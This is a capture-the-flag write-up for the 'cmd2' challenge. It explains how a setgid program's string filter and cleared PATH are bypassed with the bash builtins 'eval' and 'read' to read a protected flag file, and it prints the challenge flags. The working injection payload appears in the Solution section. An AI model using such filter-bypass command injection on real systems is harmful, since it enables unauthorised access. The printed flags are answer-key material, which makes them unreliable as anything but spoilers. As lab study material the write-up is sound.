# 13 - cmd2

## Walkthrough
In order to connect via SSH to the machine, we need the flag from `cmd1` which is "PATH_environment?_Now_I_really_g3t_it,_mommy!".

We first run `ls -la` to see which files exist in our machine:
```bash
cmd2@ubuntu:~$ ls -la
total 44
drwxr-x---   5 root cmd2      4096 Mar 21 10:01 .
drwxr-xr-x 128 root root      4096 May  3 07:30 ..
d---------   2 root root      4096 Jul 14  2015 .bash_history
-r-xr-sr-x   1 root cmd2_pwn 16368 Mar 21 10:01 cmd2
-rw-r--r--   1 root root       619 Mar 21 10:00 cmd2.c
-r--r-----   1 root cmd2_pwn    47 Apr  1 06:06 flag
dr-xr-xr-x   2 root root      4096 Jul 22  2015 .irssi
drwxr-xr-x   2 root root      4096 Oct 23  2016 .pwntools-cache
```

See first exercise for reason we can't just read `flag` directly.

We then turn to the `cmd2.c` file and its corresponding compiled binary file `cmd2`:
```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "=")!=0;
        r += strstr(cmd, "PATH")!=0;
        r += strstr(cmd, "export")!=0;
        r += strstr(cmd, "/")!=0;
        r += strstr(cmd, "`")!=0;
        r += strstr(cmd, "flag")!=0;
        return r;
}

extern char** environ;
void delete_env(){
        char** p;
        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
        delete_env();
        putenv("PATH=/no_command_execution_until_you_become_a_hacker");
        if(filter(argv[1])) return 0;
        printf("%s\n", argv[1]);
        setregid(getegid(), getegid());
        system( argv[1] );
        return 0;
}
```

In order to pass the check `if(filter(argv[1])) return 0;` we need to provide an input via `argv[1]` which can not include any of the strings: "=", "PATH", "export", "/", "`", "flag". See previous exercise ("cmd1") for the reason.

Calling `putenv(3)` adds an environment variable, `PATH`, which a value of `/no_command_execution_until_you_become_a_hacker`. See previous exercise ("cmd1") for the effect of that on binaries we run.

So we have a command we can runs using `system(3)`, but we can't run any command because "PATH" doesn't allow use to search any binary under a non-existing directory, and as oppose to the previous exercise, we can't use the full path of a binary here, since the character "/" is not allowed, so `/bin/<cmd>` is not allowed. We also can't provide new environment variables because "=" is not allowed.

But not all hope is lost, because according to `bash(1)` we can still use the shell builtin functions ("SHELL BUILTIN COMMANDS" in `bash(1)`). After a lot of reading, one builtin function draws the attention, and it is `eval`. The reason is it executes a command it receives at parameter. Another builtin function which draws attention is `read`, as it receives an input from the user. If we make sure that the `main` function would execute the `system(3)` call before we enter the command we want, we would be able to pass the `filter()` function.

By using the `read` builtin function, we are able to receive input from `stdin` when the `main` executes the `system(3)` call. Then, by using the `eval` builtin function, we can execute the input we receive as a command. The flow will be as follows:
* We pass an argument to `main` which passes the `filter` function (no "=", "PATH", "export", "/", "`", "flag")
* `system(3)` is called on our argument
* The command which is executed receives the command we would like to run (ideally `/bin/cat flag`) as an input
* The command which was read as an input will be executed and read the flag


So it seems all we need to do is just:

1. Provide the command `eval $(read x; echo $x)` as the first argument to the program (`argv[1]`)

## Solution

```bash
cmd2@ubuntu:~$ ./cmd2 'eval "$(read x; echo $x)"'
eval "$(read x; echo $x)"
/bin/cat flag
Shell_variables_can_be_quite_fun_to_play_with!
```